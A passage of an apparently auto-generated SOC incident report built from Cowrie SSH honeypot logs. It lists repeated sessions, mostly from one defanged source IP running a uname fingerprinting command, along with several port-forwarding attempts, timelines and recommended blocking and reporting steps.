- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63b7e26fb9ce

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:49 |
| **Last Seen** | 2026-07-23 20:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:49:17` | `cowrie.session.connect` |
| `2026-07-23 20:49:17` | `cowrie.client.version` |
| `2026-07-23 20:49:17` | `cowrie.client.kex` |
| `2026-07-23 20:49:18` | `cowrie.login.success` |
| `2026-07-23 20:49:19` | `cowrie.session.params` |
| `2026-07-23 20:49:19` | `cowrie.command.input` |
| `2026-07-23 20:49:19` | `cowrie.log.closed` |
| `2026-07-23 20:49:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42a71992bbc2

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:49 |
| **Last Seen** | 2026-07-23 20:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:49:23` | `cowrie.session.connect` |
| `2026-07-23 20:49:23` | `cowrie.client.version` |
| `2026-07-23 20:49:23` | `cowrie.client.kex` |
| `2026-07-23 20:49:24` | `cowrie.login.success` |
| `2026-07-23 20:49:25` | `cowrie.session.params` |
| `2026-07-23 20:49:25` | `cowrie.command.input` |
| `2026-07-23 20:49:25` | `cowrie.log.closed` |
| `2026-07-23 20:49:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08426560b4be

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:49 |
| **Last Seen** | 2026-07-23 20:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:49:29` | `cowrie.session.connect` |
| `2026-07-23 20:49:29` | `cowrie.client.version` |
| `2026-07-23 20:49:29` | `cowrie.client.kex` |
| `2026-07-23 20:49:29` | `cowrie.login.success` |
| `2026-07-23 20:49:30` | `cowrie.session.params` |
| `2026-07-23 20:49:30` | `cowrie.command.input` |
| `2026-07-23 20:49:30` | `cowrie.log.closed` |
| `2026-07-23 20:49:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dea4f1ea9f9b

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:49 |
| **Last Seen** | 2026-07-23 20:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:49:34` | `cowrie.session.connect` |
| `2026-07-23 20:49:34` | `cowrie.client.version` |
| `2026-07-23 20:49:34` | `cowrie.client.kex` |
| `2026-07-23 20:49:35` | `cowrie.login.success` |
| `2026-07-23 20:49:35` | `cowrie.session.params` |
| `2026-07-23 20:49:35` | `cowrie.command.input` |
| `2026-07-23 20:49:36` | `cowrie.log.closed` |
| `2026-07-23 20:49:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fccdd0a9c4a

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:49 |
| **Last Seen** | 2026-07-23 20:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:49:40` | `cowrie.session.connect` |
| `2026-07-23 20:49:40` | `cowrie.client.version` |
| `2026-07-23 20:49:40` | `cowrie.client.kex` |
| `2026-07-23 20:49:41` | `cowrie.login.success` |
| `2026-07-23 20:49:42` | `cowrie.session.params` |
| `2026-07-23 20:49:42` | `cowrie.command.input` |
| `2026-07-23 20:49:42` | `cowrie.log.closed` |
| `2026-07-23 20:49:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d96b3f875edd

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:49 |
| **Last Seen** | 2026-07-23 20:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:49:46` | `cowrie.session.connect` |
| `2026-07-23 20:49:46` | `cowrie.client.version` |
| `2026-07-23 20:49:46` | `cowrie.client.kex` |
| `2026-07-23 20:49:46` | `cowrie.login.success` |
| `2026-07-23 20:49:47` | `cowrie.session.params` |
| `2026-07-23 20:49:47` | `cowrie.command.input` |
| `2026-07-23 20:49:47` | `cowrie.log.closed` |
| `2026-07-23 20:49:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b879a30212c

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:49 |
| **Last Seen** | 2026-07-23 20:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:49:52` | `cowrie.session.connect` |
| `2026-07-23 20:49:52` | `cowrie.client.version` |
| `2026-07-23 20:49:52` | `cowrie.client.kex` |
| `2026-07-23 20:49:52` | `cowrie.login.success` |
| `2026-07-23 20:49:53` | `cowrie.session.params` |
| `2026-07-23 20:49:53` | `cowrie.command.input` |
| `2026-07-23 20:49:53` | `cowrie.log.closed` |
| `2026-07-23 20:49:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55663912a9d6

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:49 |
| **Last Seen** | 2026-07-23 20:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:49:57` | `cowrie.session.connect` |
| `2026-07-23 20:49:57` | `cowrie.client.version` |
| `2026-07-23 20:49:57` | `cowrie.client.kex` |
| `2026-07-23 20:49:58` | `cowrie.login.success` |
| `2026-07-23 20:49:59` | `cowrie.session.params` |
| `2026-07-23 20:49:59` | `cowrie.command.input` |
| `2026-07-23 20:49:59` | `cowrie.log.closed` |
| `2026-07-23 20:49:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5adad4da4b8

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:50 |
| **Last Seen** | 2026-07-23 20:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:50:03` | `cowrie.session.connect` |
| `2026-07-23 20:50:03` | `cowrie.client.version` |
| `2026-07-23 20:50:03` | `cowrie.client.kex` |
| `2026-07-23 20:50:03` | `cowrie.login.success` |
| `2026-07-23 20:50:04` | `cowrie.session.params` |
| `2026-07-23 20:50:04` | `cowrie.command.input` |
| `2026-07-23 20:50:04` | `cowrie.log.closed` |
| `2026-07-23 20:50:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd0fffc27924

| Field | Detail |
|---|---|
| **Source IP** | `116.48.151[.]136` |
| **First Seen** | 2026-07-23 20:50 |
| **Last Seen** | 2026-07-23 20:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:50:08` | `cowrie.session.connect` |
| `2026-07-23 20:50:09` | `cowrie.client.version` |
| `2026-07-23 20:50:09` | `cowrie.client.kex` |
| `2026-07-23 20:50:11` | `cowrie.login.success` |
| `2026-07-23 20:50:12` | `cowrie.direct-tcpip.request` |
| `2026-07-23 20:50:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.48.151[.]136` to AbuseIPDB if not already reported
- [ ] Block `116.48.151[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8adcb15b62ed

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:50 |
| **Last Seen** | 2026-07-23 20:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:50:09` | `cowrie.session.connect` |
| `2026-07-23 20:50:09` | `cowrie.client.version` |
| `2026-07-23 20:50:09` | `cowrie.client.kex` |
| `2026-07-23 20:50:09` | `cowrie.login.success` |
| `2026-07-23 20:50:10` | `cowrie.session.params` |
| `2026-07-23 20:50:10` | `cowrie.command.input` |
| `2026-07-23 20:50:10` | `cowrie.log.closed` |
| `2026-07-23 20:50:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02cfcb196221

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:50 |
| **Last Seen** | 2026-07-23 20:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:50:15` | `cowrie.session.connect` |
| `2026-07-23 20:50:15` | `cowrie.client.version` |
| `2026-07-23 20:50:15` | `cowrie.client.kex` |
| `2026-07-23 20:50:15` | `cowrie.login.success` |
| `2026-07-23 20:50:16` | `cowrie.session.params` |
| `2026-07-23 20:50:16` | `cowrie.command.input` |
| `2026-07-23 20:50:16` | `cowrie.log.closed` |
| `2026-07-23 20:50:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4d1c18914a0

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:50 |
| **Last Seen** | 2026-07-23 20:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:50:20` | `cowrie.session.connect` |
| `2026-07-23 20:50:20` | `cowrie.client.version` |
| `2026-07-23 20:50:20` | `cowrie.client.kex` |
| `2026-07-23 20:50:21` | `cowrie.login.success` |
| `2026-07-23 20:50:21` | `cowrie.session.params` |
| `2026-07-23 20:50:21` | `cowrie.command.input` |
| `2026-07-23 20:50:21` | `cowrie.log.closed` |
| `2026-07-23 20:50:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebf1e7b1886f

| Field | Detail |
|---|---|
| **Source IP** | `118.163.145[.]175` |
| **First Seen** | 2026-07-23 20:50 |
| **Last Seen** | 2026-07-23 20:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:50:22` | `cowrie.session.connect` |
| `2026-07-23 20:50:22` | `cowrie.client.version` |
| `2026-07-23 20:50:22` | `cowrie.client.kex` |
| `2026-07-23 20:50:25` | `cowrie.login.success` |
| `2026-07-23 20:50:25` | `cowrie.direct-tcpip.request` |
| `2026-07-23 20:50:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.163.145[.]175` to AbuseIPDB if not already reported
- [ ] Block `118.163.145[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9252c5bb0397

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:50 |
| **Last Seen** | 2026-07-23 20:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:50:26` | `cowrie.session.connect` |
| `2026-07-23 20:50:26` | `cowrie.client.version` |
| `2026-07-23 20:50:26` | `cowrie.client.kex` |
| `2026-07-23 20:50:26` | `cowrie.login.success` |
| `2026-07-23 20:50:27` | `cowrie.session.params` |
| `2026-07-23 20:50:27` | `cowrie.command.input` |
| `2026-07-23 20:50:27` | `cowrie.log.closed` |
| `2026-07-23 20:50:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edabdb885d55

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:50 |
| **Last Seen** | 2026-07-23 20:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:50:31` | `cowrie.session.connect` |
| `2026-07-23 20:50:31` | `cowrie.client.version` |
| `2026-07-23 20:50:31` | `cowrie.client.kex` |
| `2026-07-23 20:50:32` | `cowrie.login.success` |
| `2026-07-23 20:50:33` | `cowrie.session.params` |
| `2026-07-23 20:50:33` | `cowrie.command.input` |
| `2026-07-23 20:50:33` | `cowrie.log.closed` |
| `2026-07-23 20:50:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cccec2c85aa

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]253` |
| **First Seen** | 2026-07-23 20:50 |
| **Last Seen** | 2026-07-23 20:50 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:50:34` | `cowrie.session.connect` |
| `2026-07-23 20:50:35` | `cowrie.client.version` |
| `2026-07-23 20:50:35` | `cowrie.client.kex` |
| `2026-07-23 20:50:37` | `cowrie.login.success` |
| `2026-07-23 20:50:39` | `cowrie.direct-tcpip.request` |
| `2026-07-23 20:50:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]253` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]253` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88a8f3a70e4b

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:50 |
| **Last Seen** | 2026-07-23 20:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:50:37` | `cowrie.session.connect` |
| `2026-07-23 20:50:37` | `cowrie.client.version` |
| `2026-07-23 20:50:37` | `cowrie.client.kex` |
| `2026-07-23 20:50:38` | `cowrie.login.success` |
| `2026-07-23 20:50:38` | `cowrie.session.params` |
| `2026-07-23 20:50:38` | `cowrie.command.input` |
| `2026-07-23 20:50:38` | `cowrie.log.closed` |
| `2026-07-23 20:50:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8914e2da2e7

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:50 |
| **Last Seen** | 2026-07-23 20:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:50:43` | `cowrie.session.connect` |
| `2026-07-23 20:50:43` | `cowrie.client.version` |
| `2026-07-23 20:50:43` | `cowrie.client.kex` |
| `2026-07-23 20:50:43` | `cowrie.login.success` |
| `2026-07-23 20:50:44` | `cowrie.session.params` |
| `2026-07-23 20:50:44` | `cowrie.command.input` |
| `2026-07-23 20:50:44` | `cowrie.log.closed` |
| `2026-07-23 20:50:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33504a33582d

| Field | Detail |
|---|---|
| **Source IP** | `95.35.29[.]192` |
| **First Seen** | 2026-07-23 20:50 |
| **Last Seen** | 2026-07-23 20:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:50:45` | `cowrie.session.connect` |
| `2026-07-23 20:50:45` | `cowrie.client.version` |
| `2026-07-23 20:50:45` | `cowrie.client.kex` |
| `2026-07-23 20:50:47` | `cowrie.login.success` |
| `2026-07-23 20:50:47` | `cowrie.direct-tcpip.request` |
| `2026-07-23 20:50:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.35.29[.]192` to AbuseIPDB if not already reported
- [ ] Block `95.35.29[.]192` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-476d1bf205ae

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:50 |
| **Last Seen** | 2026-07-23 20:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:50:48` | `cowrie.session.connect` |
| `2026-07-23 20:50:48` | `cowrie.client.version` |
| `2026-07-23 20:50:48` | `cowrie.client.kex` |
| `2026-07-23 20:50:49` | `cowrie.login.success` |
| `2026-07-23 20:50:49` | `cowrie.session.params` |
| `2026-07-23 20:50:49` | `cowrie.command.input` |
| `2026-07-23 20:50:49` | `cowrie.log.closed` |
| `2026-07-23 20:50:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f054ada45238

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:50 |
| **Last Seen** | 2026-07-23 20:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:50:54` | `cowrie.session.connect` |
| `2026-07-23 20:50:54` | `cowrie.client.version` |
| `2026-07-23 20:50:54` | `cowrie.client.kex` |
| `2026-07-23 20:50:54` | `cowrie.login.success` |
| `2026-07-23 20:50:55` | `cowrie.session.params` |
| `2026-07-23 20:50:55` | `cowrie.command.input` |
| `2026-07-23 20:50:55` | `cowrie.log.closed` |
| `2026-07-23 20:50:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00e2a38ddfe3

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:50 |
| **Last Seen** | 2026-07-23 20:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:50:59` | `cowrie.session.connect` |
| `2026-07-23 20:50:59` | `cowrie.client.version` |
| `2026-07-23 20:50:59` | `cowrie.client.kex` |
| `2026-07-23 20:50:59` | `cowrie.login.success` |
| `2026-07-23 20:51:00` | `cowrie.session.params` |
| `2026-07-23 20:51:00` | `cowrie.command.input` |
| `2026-07-23 20:51:00` | `cowrie.log.closed` |
| `2026-07-23 20:51:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a57c89c9db06

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:51 |
| **Last Seen** | 2026-07-23 20:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:51:04` | `cowrie.session.connect` |
| `2026-07-23 20:51:04` | `cowrie.client.version` |
| `2026-07-23 20:51:04` | `cowrie.client.kex` |
| `2026-07-23 20:51:05` | `cowrie.login.success` |
| `2026-07-23 20:51:05` | `cowrie.session.params` |
| `2026-07-23 20:51:05` | `cowrie.command.input` |
| `2026-07-23 20:51:05` | `cowrie.log.closed` |
| `2026-07-23 20:51:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a511ea2fc96a

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:51 |
| **Last Seen** | 2026-07-23 20:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:51:10` | `cowrie.session.connect` |
| `2026-07-23 20:51:10` | `cowrie.client.version` |
| `2026-07-23 20:51:10` | `cowrie.client.kex` |
| `2026-07-23 20:51:10` | `cowrie.login.success` |
| `2026-07-23 20:51:11` | `cowrie.session.params` |
| `2026-07-23 20:51:11` | `cowrie.command.input` |
| `2026-07-23 20:51:11` | `cowrie.log.closed` |
| `2026-07-23 20:51:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54bebf54e877

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:51 |
| **Last Seen** | 2026-07-23 20:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:51:15` | `cowrie.session.connect` |
| `2026-07-23 20:51:15` | `cowrie.client.version` |
| `2026-07-23 20:51:15` | `cowrie.client.kex` |
